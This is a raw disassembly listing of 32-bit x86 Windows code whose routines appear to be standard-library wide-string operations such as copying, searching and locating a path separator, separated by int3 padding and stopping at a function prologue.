  406649:	8b f0                	mov    %eax,%esi
  40664b:	83 c4 0c             	add    $0xc,%esp
  40664e:	85 f6                	test   %esi,%esi
  406650:	75 ce                	jne    0x406620
  406652:	5f                   	pop    %edi
  406653:	5e                   	pop    %esi
  406654:	83 c8 ff             	or     $0xffffffff,%eax
  406657:	5b                   	pop    %ebx
  406658:	5d                   	pop    %ebp
  406659:	c2 0c 00             	ret    $0xc
  40665c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40665f:	83 79 14 10          	cmpl   $0x10,0x14(%ecx)
  406663:	72 02                	jb     0x406667
  406665:	8b 09                	mov    (%ecx),%ecx
  406667:	5f                   	pop    %edi
  406668:	8b c6                	mov    %esi,%eax
  40666a:	5e                   	pop    %esi
  40666b:	2b c1                	sub    %ecx,%eax
  40666d:	5b                   	pop    %ebx
  40666e:	5d                   	pop    %ebp
  40666f:	c2 0c 00             	ret    $0xc
  406672:	cc                   	int3
  406673:	cc                   	int3
  406674:	cc                   	int3
  406675:	cc                   	int3
  406676:	cc                   	int3
  406677:	cc                   	int3
  406678:	cc                   	int3
  406679:	cc                   	int3
  40667a:	cc                   	int3
  40667b:	cc                   	int3
  40667c:	cc                   	int3
  40667d:	cc                   	int3
  40667e:	cc                   	int3
  40667f:	cc                   	int3
  406680:	55                   	push   %ebp
  406681:	8b ec                	mov    %esp,%ebp
  406683:	83 ec 10             	sub    $0x10,%esp
  406686:	33 c0                	xor    %eax,%eax
  406688:	85 c9                	test   %ecx,%ecx
  40668a:	74 3c                	je     0x4066c8
  40668c:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40668f:	77 0e                	ja     0x40669f
  406691:	51                   	push   %ecx
  406692:	ff 15 ec a1 40 00    	call   *0x40a1ec
  406698:	83 c4 04             	add    $0x4,%esp
  40669b:	85 c0                	test   %eax,%eax
  40669d:	75 29                	jne    0x4066c8
  40669f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4066a2:	50                   	push   %eax
  4066a3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4066a6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4066ad:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  4066b3:	68 58 b0 40 00       	push   $0x40b058
  4066b8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4066bb:	51                   	push   %ecx
  4066bc:	c7 45 f0 e4 a8 40 00 	movl   $0x40a8e4,-0x10(%ebp)
  4066c3:	e8 a4 24 00 00       	call   0x408b6c
  4066c8:	8b e5                	mov    %ebp,%esp
  4066ca:	5d                   	pop    %ebp
  4066cb:	c3                   	ret
  4066cc:	cc                   	int3
  4066cd:	cc                   	int3
  4066ce:	cc                   	int3
  4066cf:	cc                   	int3
  4066d0:	3b f7                	cmp    %edi,%esi
  4066d2:	74 69                	je     0x40673d
  4066d4:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4066d8:	72 0c                	jb     0x4066e6
  4066da:	8b 06                	mov    (%esi),%eax
  4066dc:	50                   	push   %eax
  4066dd:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4066e3:	83 c4 04             	add    $0x4,%esp
  4066e6:	33 c9                	xor    %ecx,%ecx
  4066e8:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4066ef:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4066f6:	66 89 0e             	mov    %cx,(%esi)
  4066f9:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4066fd:	73 15                	jae    0x406714
  4066ff:	8b 57 10             	mov    0x10(%edi),%edx
  406702:	8d 44 12 02          	lea    0x2(%edx,%edx,1),%eax
  406706:	50                   	push   %eax
  406707:	57                   	push   %edi
  406708:	56                   	push   %esi
  406709:	ff 15 fc a1 40 00    	call   *0x40a1fc
  40670f:	83 c4 0c             	add    $0xc,%esp
  406712:	eb 0a                	jmp    0x40671e
  406714:	8b 0f                	mov    (%edi),%ecx
  406716:	89 0e                	mov    %ecx,(%esi)
  406718:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  40671e:	8b 57 10             	mov    0x10(%edi),%edx
  406721:	89 56 10             	mov    %edx,0x10(%esi)
  406724:	8b 47 14             	mov    0x14(%edi),%eax
  406727:	89 46 14             	mov    %eax,0x14(%esi)
  40672a:	33 c9                	xor    %ecx,%ecx
  40672c:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  406733:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  40673a:	66 89 0f             	mov    %cx,(%edi)
  40673d:	8b c6                	mov    %esi,%eax
  40673f:	c3                   	ret
  406740:	55                   	push   %ebp
  406741:	8b ec                	mov    %esp,%ebp
  406743:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406746:	53                   	push   %ebx
  406747:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40674a:	56                   	push   %esi
  40674b:	8b 71 10             	mov    0x10(%ecx),%esi
  40674e:	3b f3                	cmp    %ebx,%esi
  406750:	73 0b                	jae    0x40675d
  406752:	68 a8 a8 40 00       	push   $0x40a8a8
  406757:	ff 15 30 a1 40 00    	call   *0x40a130
  40675d:	2b f3                	sub    %ebx,%esi
  40675f:	3b c6                	cmp    %esi,%eax
  406761:	73 02                	jae    0x406765
  406763:	8b f0                	mov    %eax,%esi
  406765:	3b f9                	cmp    %ecx,%edi
  406767:	75 1e                	jne    0x406787
  406769:	8d 0c 1e             	lea    (%esi,%ebx,1),%ecx
  40676c:	83 c8 ff             	or     $0xffffffff,%eax
  40676f:	8b f7                	mov    %edi,%esi
  406771:	e8 aa 0c 00 00       	call   0x407420
  406776:	8b c3                	mov    %ebx,%eax
  406778:	33 c9                	xor    %ecx,%ecx
  40677a:	e8 a1 0c 00 00       	call   0x407420
  40677f:	5e                   	pop    %esi
  406780:	8b c7                	mov    %edi,%eax
  406782:	5b                   	pop    %ebx
  406783:	5d                   	pop    %ebp
  406784:	c2 08 00             	ret    $0x8
  406787:	8b c7                	mov    %edi,%eax
  406789:	e8 12 0d 00 00       	call   0x4074a0
  40678e:	84 c0                	test   %al,%al
  406790:	74 4f                	je     0x4067e1
  406792:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406795:	b8 08 00 00 00       	mov    $0x8,%eax
  40679a:	39 41 14             	cmp    %eax,0x14(%ecx)
  40679d:	72 02                	jb     0x4067a1
  40679f:	8b 09                	mov    (%ecx),%ecx
  4067a1:	39 47 14             	cmp    %eax,0x14(%edi)
  4067a4:	72 04                	jb     0x4067aa
  4067a6:	8b 07                	mov    (%edi),%eax
  4067a8:	eb 02                	jmp    0x4067ac
  4067aa:	8b c7                	mov    %edi,%eax
  4067ac:	8b 55 0c             	mov    0xc(%ebp),%edx
  4067af:	8d 1c 36             	lea    (%esi,%esi,1),%ebx
  4067b2:	53                   	push   %ebx
  4067b3:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  4067b6:	51                   	push   %ecx
  4067b7:	50                   	push   %eax
  4067b8:	e8 75 23 00 00       	call   0x408b32
  4067bd:	83 c4 0c             	add    $0xc,%esp
  4067c0:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4067c4:	89 77 10             	mov    %esi,0x10(%edi)
  4067c7:	72 10                	jb     0x4067d9
  4067c9:	8b 07                	mov    (%edi),%eax
  4067cb:	33 d2                	xor    %edx,%edx
  4067cd:	66 89 14 03          	mov    %dx,(%ebx,%eax,1)
  4067d1:	5e                   	pop    %esi
  4067d2:	8b c7                	mov    %edi,%eax
  4067d4:	5b                   	pop    %ebx
  4067d5:	5d                   	pop    %ebp
  4067d6:	c2 08 00             	ret    $0x8
  4067d9:	8b c7                	mov    %edi,%eax
  4067db:	33 d2                	xor    %edx,%edx
  4067dd:	66 89 14 03          	mov    %dx,(%ebx,%eax,1)
  4067e1:	5e                   	pop    %esi
  4067e2:	8b c7                	mov    %edi,%eax
  4067e4:	5b                   	pop    %ebx
  4067e5:	5d                   	pop    %ebp
  4067e6:	c2 08 00             	ret    $0x8
  4067e9:	cc                   	int3
  4067ea:	cc                   	int3
  4067eb:	cc                   	int3
  4067ec:	cc                   	int3
  4067ed:	cc                   	int3
  4067ee:	cc                   	int3
  4067ef:	cc                   	int3
  4067f0:	55                   	push   %ebp
  4067f1:	8b ec                	mov    %esp,%ebp
  4067f3:	83 ec 0c             	sub    $0xc,%esp
  4067f6:	8b 4f 10             	mov    0x10(%edi),%ecx
  4067f9:	53                   	push   %ebx
  4067fa:	8b d8                	mov    %eax,%ebx
  4067fc:	56                   	push   %esi
  4067fd:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406804:	3b cb                	cmp    %ebx,%ecx
  406806:	0f 82 c9 01 00 00    	jb     0x4069d5
  40680c:	8b c1                	mov    %ecx,%eax
  40680e:	2b c3                	sub    %ebx,%eax
  406810:	3b 45 08             	cmp    0x8(%ebp),%eax
  406813:	73 03                	jae    0x406818
  406815:	89 45 08             	mov    %eax,0x8(%ebp)
  406818:	8b 55 0c             	mov    0xc(%ebp),%edx
  40681b:	8b 52 10             	mov    0x10(%edx),%edx
  40681e:	83 fa ff             	cmp    $0xffffffff,%edx
  406821:	73 03                	jae    0x406826
  406823:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406826:	8b d1                	mov    %ecx,%edx
  406828:	2b 55 08             	sub    0x8(%ebp),%edx
  40682b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40682e:	83 ca ff             	or     $0xffffffff,%edx
  406831:	2b 55 fc             	sub    -0x4(%ebp),%edx
  406834:	3b 55 f4             	cmp    -0xc(%ebp),%edx
  406837:	77 0b                	ja     0x406844
  406839:	68 98 a8 40 00       	push   $0x40a898
  40683e:	ff 15 38 a1 40 00    	call   *0x40a138
  406844:	8b 55 08             	mov    0x8(%ebp),%edx
  406847:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40684a:	2b c2                	sub    %edx,%eax
  40684c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40684f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406852:	03 c6                	add    %esi,%eax
  406854:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406857:	3b c8                	cmp    %eax,%ecx
  406859:	73 0f                	jae    0x40686a
  40685b:	8b f0                	mov    %eax,%esi
  40685d:	8b c7                	mov    %edi,%eax
  40685f:	e8 3c 0c 00 00       	call   0x4074a0
  406864:	8b 75 fc             	mov    -0x4(%ebp),%esi
  406867:	8b 55 08             	mov    0x8(%ebp),%edx
  40686a:	8b 47 14             	mov    0x14(%edi),%eax
  40686d:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  406870:	74 77                	je     0x4068e9
  406872:	83 f8 08             	cmp    $0x8,%eax
  406875:	72 07                	jb     0x40687e
  406877:	8b 0f                	mov    (%edi),%ecx
  406879:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40687c:	eb 03                	jmp    0x406881
  40687e:	89 7d 08             	mov    %edi,0x8(%ebp)
  406881:	83 f8 08             	cmp    $0x8,%eax
  406884:	72 04                	jb     0x40688a
  406886:	8b 07                	mov    (%edi),%eax
  406888:	eb 02                	jmp    0x40688c
  40688a:	8b c7                	mov    %edi,%eax
  40688c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40688f:	03 c9                	add    %ecx,%ecx
  406891:	51                   	push   %ecx
  406892:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406895:	03 d3                	add    %ebx,%edx
  406897:	8d 14 51             	lea    (%ecx,%edx,2),%edx
  40689a:	52                   	push   %edx
  40689b:	8d 0c 33             	lea    (%ebx,%esi,1),%ecx
  40689e:	8d 14 48             	lea    (%eax,%ecx,2),%edx
  4068a1:	52                   	push   %edx
  4068a2:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4068a8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4068ab:	b9 08 00 00 00       	mov    $0x8,%ecx
  4068b0:	83 c4 0c             	add    $0xc,%esp
  4068b3:	39 48 14             	cmp    %ecx,0x14(%eax)
  4068b6:	72 02                	jb     0x4068ba
  4068b8:	8b 00                	mov    (%eax),%eax
  4068ba:	39 4f 14             	cmp    %ecx,0x14(%edi)
  4068bd:	72 15                	jb     0x4068d4
  4068bf:	8b 0f                	mov    (%edi),%ecx
  4068c1:	8d 14 36             	lea    (%esi,%esi,1),%edx
  4068c4:	52                   	push   %edx
  4068c5:	50                   	push   %eax
  4068c6:	8d 04 59             	lea    (%ecx,%ebx,2),%eax
  4068c9:	50                   	push   %eax
  4068ca:	e8 63 22 00 00       	call   0x408b32
  4068cf:	e9 d2 00 00 00       	jmp    0x4069a6
  4068d4:	8d 14 36             	lea    (%esi,%esi,1),%edx
  4068d7:	52                   	push   %edx
  4068d8:	8b cf                	mov    %edi,%ecx
  4068da:	50                   	push   %eax
  4068db:	8d 04 59             	lea    (%ecx,%ebx,2),%eax
  4068de:	50                   	push   %eax
  4068df:	e8 4e 22 00 00       	call   0x408b32
  4068e4:	e9 bd 00 00 00       	jmp    0x4069a6
  4068e9:	3b f2                	cmp    %edx,%esi
  4068eb:	77 58                	ja     0x406945
  4068ed:	83 f8 08             	cmp    $0x8,%eax
  4068f0:	72 04                	jb     0x4068f6
  4068f2:	8b 0f                	mov    (%edi),%ecx
  4068f4:	eb 02                	jmp    0x4068f8
  4068f6:	8b cf                	mov    %edi,%ecx
  4068f8:	83 f8 08             	cmp    $0x8,%eax
  4068fb:	72 04                	jb     0x406901
  4068fd:	8b 07                	mov    (%edi),%eax
  4068ff:	eb 02                	jmp    0x406903
  406901:	8b c7                	mov    %edi,%eax
  406903:	8d 14 36             	lea    (%esi,%esi,1),%edx
  406906:	52                   	push   %edx
  406907:	51                   	push   %ecx
  406908:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  40690b:	50                   	push   %eax
  40690c:	ff 15 fc a1 40 00    	call   *0x40a1fc
  406912:	8b 47 14             	mov    0x14(%edi),%eax
  406915:	83 c4 0c             	add    $0xc,%esp
  406918:	83 f8 08             	cmp    $0x8,%eax
  40691b:	72 04                	jb     0x406921
  40691d:	8b 0f                	mov    (%edi),%ecx
  40691f:	eb 02                	jmp    0x406923
  406921:	8b cf                	mov    %edi,%ecx
  406923:	83 f8 08             	cmp    $0x8,%eax
  406926:	72 04                	jb     0x40692c
  406928:	8b 07                	mov    (%edi),%eax
  40692a:	eb 02                	jmp    0x40692e
  40692c:	8b c7                	mov    %edi,%eax
  40692e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406931:	03 d2                	add    %edx,%edx
  406933:	52                   	push   %edx
  406934:	8b 55 08             	mov    0x8(%ebp),%edx
  406937:	03 d3                	add    %ebx,%edx
  406939:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  40693c:	03 de                	add    %esi,%ebx
  40693e:	51                   	push   %ecx
  40693f:	8d 14 58             	lea    (%eax,%ebx,2),%edx
  406942:	52                   	push   %edx
  406943:	eb 5b                	jmp    0x4069a0
  406945:	83 f8 08             	cmp    $0x8,%eax
  406948:	72 07                	jb     0x406951
  40694a:	8b 0f                	mov    (%edi),%ecx
  40694c:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40694f:	eb 03                	jmp    0x406954
  406951:	89 7d 08             	mov    %edi,0x8(%ebp)
  406954:	83 f8 08             	cmp    $0x8,%eax
  406957:	72 04                	jb     0x40695d
  406959:	8b 07                	mov    (%edi),%eax
  40695b:	eb 02                	jmp    0x40695f
  40695d:	8b c7                	mov    %edi,%eax
  40695f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406962:	03 c9                	add    %ecx,%ecx
  406964:	51                   	push   %ecx
  406965:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406968:	03 d3                	add    %ebx,%edx
  40696a:	8d 14 51             	lea    (%ecx,%edx,2),%edx
  40696d:	52                   	push   %edx
  40696e:	8d 0c 33             	lea    (%ebx,%esi,1),%ecx
  406971:	8d 14 48             	lea    (%eax,%ecx,2),%edx
  406974:	52                   	push   %edx
  406975:	ff 15 fc a1 40 00    	call   *0x40a1fc
  40697b:	8b 47 14             	mov    0x14(%edi),%eax
  40697e:	83 c4 0c             	add    $0xc,%esp
  406981:	83 f8 08             	cmp    $0x8,%eax
  406984:	72 04                	jb     0x40698a
  406986:	8b 0f                	mov    (%edi),%ecx
  406988:	eb 02                	jmp    0x40698c
  40698a:	8b cf                	mov    %edi,%ecx
  40698c:	83 f8 08             	cmp    $0x8,%eax
  40698f:	72 04                	jb     0x406995
  406991:	8b 07                	mov    (%edi),%eax
  406993:	eb 02                	jmp    0x406997
  406995:	8b c7                	mov    %edi,%eax
  406997:	8d 14 36             	lea    (%esi,%esi,1),%edx
  40699a:	52                   	push   %edx
  40699b:	51                   	push   %ecx
  40699c:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  40699f:	50                   	push   %eax
  4069a0:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4069a6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4069a9:	83 c4 0c             	add    $0xc,%esp
  4069ac:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4069b0:	5e                   	pop    %esi
  4069b1:	89 4f 10             	mov    %ecx,0x10(%edi)
  4069b4:	5b                   	pop    %ebx
  4069b5:	72 10                	jb     0x4069c7
  4069b7:	8b 07                	mov    (%edi),%eax
  4069b9:	33 d2                	xor    %edx,%edx
  4069bb:	66 89 14 48          	mov    %dx,(%eax,%ecx,2)
  4069bf:	8b c7                	mov    %edi,%eax
  4069c1:	8b e5                	mov    %ebp,%esp
  4069c3:	5d                   	pop    %ebp
  4069c4:	c2 08 00             	ret    $0x8
  4069c7:	8b c7                	mov    %edi,%eax
  4069c9:	33 d2                	xor    %edx,%edx
  4069cb:	66 89 14 48          	mov    %dx,(%eax,%ecx,2)
  4069cf:	8b e5                	mov    %ebp,%esp
  4069d1:	5d                   	pop    %ebp
  4069d2:	c2 08 00             	ret    $0x8
  4069d5:	68 a8 a8 40 00       	push   $0x40a8a8
  4069da:	ff 15 30 a1 40 00    	call   *0x40a130
  4069e0:	cc                   	int3
  4069e1:	cc                   	int3
  4069e2:	cc                   	int3
  4069e3:	cc                   	int3
  4069e4:	cc                   	int3
  4069e5:	cc                   	int3
  4069e6:	cc                   	int3
  4069e7:	cc                   	int3
  4069e8:	cc                   	int3
  4069e9:	cc                   	int3
  4069ea:	cc                   	int3
  4069eb:	cc                   	int3
  4069ec:	cc                   	int3
  4069ed:	cc                   	int3
  4069ee:	cc                   	int3
  4069ef:	cc                   	int3
  4069f0:	55                   	push   %ebp
  4069f1:	8b ec                	mov    %esp,%ebp
  4069f3:	8b 55 08             	mov    0x8(%ebp),%edx
  4069f6:	83 ec 08             	sub    $0x8,%esp
  4069f9:	53                   	push   %ebx
  4069fa:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4069fd:	56                   	push   %esi
  4069fe:	8b 75 10             	mov    0x10(%ebp),%esi
  406a01:	85 f6                	test   %esi,%esi
  406a03:	75 05                	jne    0x406a0a
  406a05:	3b 42 10             	cmp    0x10(%edx),%eax
  406a08:	76 45                	jbe    0x406a4f
  406a0a:	8b 4a 10             	mov    0x10(%edx),%ecx
  406a0d:	57                   	push   %edi
  406a0e:	3b c1                	cmp    %ecx,%eax
  406a10:	73 39                	jae    0x406a4b
  406a12:	2b c8                	sub    %eax,%ecx
  406a14:	8b f9                	mov    %ecx,%edi
  406a16:	3b f7                	cmp    %edi,%esi
  406a18:	77 31                	ja     0x406a4b
  406a1a:	b9 01 00 00 00       	mov    $0x1,%ecx
  406a1f:	2b ce                	sub    %esi,%ecx
  406a21:	03 f9                	add    %ecx,%edi
  406a23:	83 7a 14 08          	cmpl   $0x8,0x14(%edx)
  406a27:	72 04                	jb     0x406a2d
  406a29:	8b 0a                	mov    (%edx),%ecx
  406a2b:	eb 02                	jmp    0x406a2f
  406a2d:	8b ca                	mov    %edx,%ecx
  406a2f:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  406a32:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406a35:	8b cf                	mov    %edi,%ecx
  406a37:	85 ff                	test   %edi,%edi
  406a39:	74 10                	je     0x406a4b
  406a3b:	0f b7 13             	movzwl (%ebx),%edx
  406a3e:	8b ff                	mov    %edi,%edi
  406a40:	66 39 10             	cmp    %dx,(%eax)
  406a43:	74 12                	je     0x406a57
  406a45:	83 c0 02             	add    $0x2,%eax
  406a48:	49                   	dec    %ecx
  406a49:	75 f5                	jne    0x406a40
  406a4b:	83 c8 ff             	or     $0xffffffff,%eax
  406a4e:	5f                   	pop    %edi
  406a4f:	5e                   	pop    %esi
  406a50:	5b                   	pop    %ebx
  406a51:	8b e5                	mov    %ebp,%esp
  406a53:	5d                   	pop    %ebp
  406a54:	c2 0c 00             	ret    $0xc
  406a57:	85 c0                	test   %eax,%eax
  406a59:	74 f0                	je     0x406a4b
  406a5b:	8b d3                	mov    %ebx,%edx
  406a5d:	8b c8                	mov    %eax,%ecx
  406a5f:	85 f6                	test   %esi,%esi
  406a61:	74 11                	je     0x406a74
  406a63:	66 8b 19             	mov    (%ecx),%bx
  406a66:	66 3b 1a             	cmp    (%edx),%bx
  406a69:	75 21                	jne    0x406a8c
  406a6b:	83 c1 02             	add    $0x2,%ecx
  406a6e:	83 c2 02             	add    $0x2,%edx
  406a71:	4e                   	dec    %esi
  406a72:	75 ef                	jne    0x406a63
  406a74:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a77:	83 79 14 08          	cmpl   $0x8,0x14(%ecx)
  406a7b:	72 02                	jb     0x406a7f
  406a7d:	8b 09                	mov    (%ecx),%ecx
  406a7f:	5f                   	pop    %edi
  406a80:	2b c1                	sub    %ecx,%eax
  406a82:	5e                   	pop    %esi
  406a83:	d1 f8                	sar    $1,%eax
  406a85:	5b                   	pop    %ebx
  406a86:	8b e5                	mov    %ebp,%esp
  406a88:	5d                   	pop    %ebp
  406a89:	c2 0c 00             	ret    $0xc
  406a8c:	1b d2                	sbb    %edx,%edx
  406a8e:	83 e2 fe             	and    $0xfffffffe,%edx
  406a91:	42                   	inc    %edx
  406a92:	74 e0                	je     0x406a74
  406a94:	8b 75 10             	mov    0x10(%ebp),%esi
  406a97:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406a9a:	8b c8                	mov    %eax,%ecx
  406a9c:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  406a9f:	83 ca ff             	or     $0xffffffff,%edx
  406aa2:	d1 f9                	sar    $1,%ecx
  406aa4:	2b d1                	sub    %ecx,%edx
  406aa6:	03 fa                	add    %edx,%edi
  406aa8:	83 c0 02             	add    $0x2,%eax
  406aab:	eb 85                	jmp    0x406a32
  406aad:	cc                   	int3
  406aae:	cc                   	int3
  406aaf:	cc                   	int3
  406ab0:	55                   	push   %ebp
  406ab1:	8b ec                	mov    %esp,%ebp
  406ab3:	51                   	push   %ecx
  406ab4:	53                   	push   %ebx
  406ab5:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406ab8:	8b 43 10             	mov    0x10(%ebx),%eax
  406abb:	85 ff                	test   %edi,%edi
  406abd:	75 13                	jne    0x406ad2
  406abf:	83 f8 ff             	cmp    $0xffffffff,%eax
  406ac2:	0f 86 98 00 00 00    	jbe    0x406b60
  406ac8:	83 c8 ff             	or     $0xffffffff,%eax
  406acb:	5b                   	pop    %ebx
  406acc:	8b e5                	mov    %ebp,%esp
  406ace:	5d                   	pop    %ebp
  406acf:	c2 04 00             	ret    $0x4
  406ad2:	56                   	push   %esi
  406ad3:	3b f8                	cmp    %eax,%edi
  406ad5:	0f 87 81 00 00 00    	ja     0x406b5c
  406adb:	2b c7                	sub    %edi,%eax
  406add:	83 f8 ff             	cmp    $0xffffffff,%eax
  406ae0:	76 03                	jbe    0x406ae5
  406ae2:	83 c8 ff             	or     $0xffffffff,%eax
  406ae5:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  406ae9:	72 04                	jb     0x406aef
  406aeb:	8b 0b                	mov    (%ebx),%ecx
  406aed:	eb 02                	jmp    0x406af1
  406aef:	8b cb                	mov    %ebx,%ecx
  406af1:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406af4:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  406af8:	75 42                	jne    0x406b3c
  406afa:	8b d7                	mov    %edi,%edx
  406afc:	b9 10 a6 40 00       	mov    $0x40a610,%ecx
  406b01:	8b c6                	mov    %esi,%eax
  406b03:	85 ff                	test   %edi,%edi
  406b05:	74 14                	je     0x406b1b
  406b07:	66 8b 18             	mov    (%eax),%bx
  406b0a:	66 3b 19             	cmp    (%ecx),%bx
  406b0d:	75 22                	jne    0x406b31
  406b0f:	83 c0 02             	add    $0x2,%eax
  406b12:	83 c1 02             	add    $0x2,%ecx
  406b15:	4a                   	dec    %edx
  406b16:	75 ef                	jne    0x406b07
  406b18:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406b1b:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  406b1f:	72 2b                	jb     0x406b4c
  406b21:	8b 0b                	mov    (%ebx),%ecx
  406b23:	8b c6                	mov    %esi,%eax
  406b25:	2b c1                	sub    %ecx,%eax
  406b27:	5e                   	pop    %esi
  406b28:	d1 f8                	sar    $1,%eax
  406b2a:	5b                   	pop    %ebx
  406b2b:	8b e5                	mov    %ebp,%esp
  406b2d:	5d                   	pop    %ebp
  406b2e:	c2 04 00             	ret    $0x4
  406b31:	1b c9                	sbb    %ecx,%ecx
  406b33:	83 e1 fe             	and    $0xfffffffe,%ecx
  406b36:	41                   	inc    %ecx
  406b37:	74 df                	je     0x406b18
  406b39:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406b3c:	8b c3                	mov    %ebx,%eax
  406b3e:	e8 2d 00 00 00       	call   0x406b70
  406b43:	3b f0                	cmp    %eax,%esi
  406b45:	74 15                	je     0x406b5c
  406b47:	83 ee 02             	sub    $0x2,%esi
  406b4a:	eb a8                	jmp    0x406af4
  406b4c:	8b cb                	mov    %ebx,%ecx
  406b4e:	8b c6                	mov    %esi,%eax
  406b50:	2b c1                	sub    %ecx,%eax
  406b52:	5e                   	pop    %esi
  406b53:	d1 f8                	sar    $1,%eax
  406b55:	5b                   	pop    %ebx
  406b56:	8b e5                	mov    %ebp,%esp
  406b58:	5d                   	pop    %ebp
  406b59:	c2 04 00             	ret    $0x4
  406b5c:	83 c8 ff             	or     $0xffffffff,%eax
  406b5f:	5e                   	pop    %esi
  406b60:	5b                   	pop    %ebx
  406b61:	8b e5                	mov    %ebp,%esp
  406b63:	5d                   	pop    %ebp
  406b64:	c2 04 00             	ret    $0x4
  406b67:	cc                   	int3
  406b68:	cc                   	int3
  406b69:	cc                   	int3
  406b6a:	cc                   	int3
  406b6b:	cc                   	int3
  406b6c:	cc                   	int3
  406b6d:	cc                   	int3
  406b6e:	cc                   	int3
  406b6f:	cc                   	int3
  406b70:	83 78 14 08          	cmpl   $0x8,0x14(%eax)
  406b74:	72 02                	jb     0x406b78
  406b76:	8b 00                	mov    (%eax),%eax
  406b78:	c3                   	ret
  406b79:	cc                   	int3
  406b7a:	cc                   	int3
  406b7b:	cc                   	int3
  406b7c:	cc                   	int3
  406b7d:	cc                   	int3
  406b7e:	cc                   	int3
  406b7f:	cc                   	int3
  406b80:	55                   	push   %ebp
  406b81:	8b ec                	mov    %esp,%ebp
  406b83:	83 ec 10             	sub    $0x10,%esp
  406b86:	33 c0                	xor    %eax,%eax
  406b88:	85 c9                	test   %ecx,%ecx
  406b8a:	74 42                	je     0x406bce
  406b8c:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  406b92:	77 11                	ja     0x406ba5
  406b94:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  406b97:	50                   	push   %eax
  406b98:	ff 15 ec a1 40 00    	call   *0x40a1ec
  406b9e:	83 c4 04             	add    $0x4,%esp
  406ba1:	85 c0                	test   %eax,%eax
  406ba3:	75 29                	jne    0x406bce
  406ba5:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406ba8:	51                   	push   %ecx
  406ba9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406bac:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406bb3:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  406bb9:	68 58 b0 40 00       	push   $0x40b058
  406bbe:	8d 55 f0             	lea    -0x10(%ebp),%edx
  406bc1:	52                   	push   %edx
  406bc2:	c7 45 f0 e4 a8 40 00 	movl   $0x40a8e4,-0x10(%ebp)
  406bc9:	e8 9e 1f 00 00       	call   0x408b6c
  406bce:	8b e5                	mov    %ebp,%esp
  406bd0:	5d                   	pop    %ebp
  406bd1:	c3                   	ret
  406bd2:	cc                   	int3
  406bd3:	cc                   	int3
  406bd4:	cc                   	int3
  406bd5:	cc                   	int3
  406bd6:	cc                   	int3
  406bd7:	cc                   	int3
  406bd8:	cc                   	int3
  406bd9:	cc                   	int3
  406bda:	cc                   	int3
  406bdb:	cc                   	int3
  406bdc:	cc                   	int3
  406bdd:	cc                   	int3
  406bde:	cc                   	int3
  406bdf:	cc                   	int3
  406be0:	55                   	push   %ebp
  406be1:	8b ec                	mov    %esp,%ebp
  406be3:	6a ff                	push   $0xffffffff
  406be5:	68 88 8f 40 00       	push   $0x408f88
  406bea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406bf0:	50                   	push   %eax
  406bf1:	83 ec 40             	sub    $0x40,%esp
  406bf4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  406bf9:	33 c5                	xor    %ebp,%eax
  406bfb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406bfe:	53                   	push   %ebx
  406bff:	56                   	push   %esi
